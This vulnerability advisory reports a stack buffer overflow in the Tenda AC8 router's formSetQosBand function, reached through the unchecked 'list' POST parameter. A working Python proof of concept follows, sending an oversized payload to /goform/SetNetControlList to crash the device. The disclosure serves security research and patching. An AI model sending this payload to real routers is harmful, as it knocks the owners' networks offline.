# Tenda router formSetQosBand function stack overflow vulnerability

> vendor:Tenda
>
> product:AC8
>
> version:v4.0 v16.03.34.09
>
> type:Stack Overflow

## Vulnerability Description

Tenda AC8 v4.0 v16.03.34.09 were discovered to contain a stack overflow via the list parameter in the formSetQosBand function.

## Vulnerability Details

In this function, the websGetVar function obtains the list variable and assigns it to s, and s is called by the set_qosMib_list function. In the set_qosMib_list function, the variable is passed to the dangerous function strcpy without processing, which may cause the stack buffer based on v9 Overflow, by obtaining the Post request of this page, the attacker can carefully construct the overflow data to conduct a denial of service attack(Dos).

<img width="555" alt="image" src="https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/6e392293-d83b-4f21-ac93-b60c95a7380e">
<img width="470" alt="image" src="https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/e9a98d73-7d13-4e2d-aa52-d2494f2ba687">


## POC

    import socket
    import os
    from pwn import *

    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

    ip = '192.168.244.130'
    port = 80

    r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    li('[+] connecting')
    r.connect((ip, port))
    li('[+] connect finish')

    rn = b'\r\n'

    p1 = b'A' * 0x500

    p2 = b'list=' + p1

    p3 = b"POST /goform/SetNetControlList" + b" HTTP/1.1" + rn
    p3 += b"Host: 192.168.244.130" + rn
    p3 += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" + rn
    p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
    p3 += b"Accept-Language: gzip, deflate" + rn
    p3 += b"Accept-Encoding: zh-CN,zh;q=0.9" + rn
    p3 += b"Cookie: password=cjq1qw" + rn
    p3 += b"Connection: close" + rn
    p3 += b"Upgrade-Insecure-Requests: 1" + rn
    p3 += (b"Content-Length: %d" % len(p2)) +rn
    p3 += b'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'+rn
    p3 += rn
    p3 += p2

    li('[+] sending payload')
    r.send(p3)

    response = r.recv(4096)
    response = response.decode()
    li(response)


   
